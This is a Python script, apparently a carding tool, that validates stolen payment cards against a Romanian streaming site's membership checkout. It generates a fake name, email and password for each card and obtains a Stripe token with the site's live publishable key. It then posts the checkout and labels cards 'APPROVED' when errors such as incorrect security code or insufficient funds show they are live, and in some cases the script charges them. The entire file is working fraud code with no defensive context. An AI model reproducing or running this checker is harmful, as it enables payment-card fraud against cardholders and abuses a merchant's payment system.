import requests
import random
import names
from bs4 import BeautifulSoup
       
class Stripe:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        

    def main(self):       
        vendor = self.detectar_tipo_tarjeta()
        #---------REQ1---------#
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        response = requests.get('https://www.streamland.ro/membership-account/membership-checkout/', headers=headers).text
        
        register_nonce = (BeautifulSoup(response , 'html.parser')).find("input", {"name": "woocommerce-register-nonce"})["value"]
   
        #---------REQ2---------#
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }


        response = requests.post('https://m.stripe.com/6', headers=headers).json()
        muid = response['muid']
        guid = response['guid']
        sid = response['sid']
     
        
        #---------REQ3---------#
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        data = f'time_on_page={random.randint(10,99999)}&pasted_fields=email&guid={guid}&muid={muid}&sid={sid}&key=pk_live_APZPK16BMAmVqyx5GXaAgfGh&payment_user_agent=stripe.js%2F78{random.randint(10000,99999)}e{random.randint(1,9)}%3B+stripe-js-v3%2F{random.randint(1,9)}c{random.randint(1000,9999)}{random.randint(1,9)}e{random.randint(1,9)}&card[number]={self.cc}&card[exp_month]={self.mes}&card[exp_year]={self.ano}&card[cvc]={self.cvv}'

        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data).json()
        id_ = response['id']


        #---------REQ4---------#
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        data = {
            'level': '2',
            'checkjavascript': '1',
            'username': self.username,
            'password': self.Password,
            'password2': self.Password,
            'bemail': self.CorreoRand,
            'bconfirmemail': self.CorreoRand,
            'fullname': '',
            'CardType': vendor,
            'tos': '1',
            'submit-checkout': '1',
            'javascriptok': '1',
            'stripeToken0': id_,
            'AccountNumber': f'XXXXXXXXXXXX{self.cc[12:]}',
            'ExpirationMonth': self.mes,
            'ExpirationYear': self.ano,
        }

        response = requests.post(
            'https://www.streamland.ro/membership-account/membership-checkout/', headers=headers, data=data).text
        
        response_code = (BeautifulSoup(response , 'html.parser')).find(class_="pmpro_message pmpro_error", id='pmpro_message')

        if response_code:
            error_message = response_code.get_text()
        
        if "Your card's security code is incorrect." in error_message:
            print("APPROVED✅\nYour card's security code is incorrect.")
            
        elif "Your card has insufficient funds." in error_message:
            print("APPROVED✅\nYour card has insufficient funds.")
        
        elif "succeeded" in error_message:
            print("APPROVED✅\nCHARGE $9")
            
        else:
            print("DECLINED❌\n" + error_message)

        
tarjeta = input("</> insert card:")    
run = Stripe(tarjeta)
run.main()
